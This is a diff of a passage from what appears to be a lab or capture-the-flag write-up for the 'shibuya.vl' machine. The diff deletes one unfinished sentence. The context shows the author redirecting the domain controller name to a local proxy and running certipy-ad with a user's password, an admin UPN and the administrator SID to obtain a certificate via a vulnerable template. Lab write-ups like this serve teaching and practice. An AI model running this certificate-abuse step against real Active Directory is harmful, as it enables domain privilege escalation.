@@ -570,7 +570,6 @@ Certipy v5.0.4 - by Oliver Lyak (ly4k)
 I first grabbed the admins SID
 
 Now i will comment out the entry in `/etc/hosts` and add `AWSJPDC0522.shibuya.vl` to the `127.0.0.1` line so that it resolves to my localhost where the proxy is
-This is because i need to access LDAP so ill use the pro
 ```python
 proxychains certipy-ad req -u 'nigel.mills' -p 'Sail2Boat3' -dc-ip '127.0.0.1' -target 'AWSJPDC0522.shibuya.vl' -ca 'shibuya-AWSJPDC0522-CA' -template 'ShibuyaWeb' -upn '_admin@shibuya.vl' -sid 'S-1-5-21-87560095-894484815-3652015022-500' -key-size 4096 -debug
 [proxychains] config file found: /etc/proxychains4.conf
